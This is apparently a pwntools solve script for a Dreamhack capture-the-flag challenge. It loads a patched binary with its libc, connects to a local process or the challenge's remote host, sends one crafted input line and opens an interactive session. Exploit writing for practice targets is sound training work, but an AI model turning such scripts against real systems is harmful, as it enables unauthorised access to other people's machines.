#!/usr/bin/env python3

from pwn import *

exe = ELF("./main_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 15355)

    return r


def main():
    r = conn()

    r.sendline(f"2 7 {0xa9}".encode())
    r.interactive()


if __name__ == "__main__":
    main()
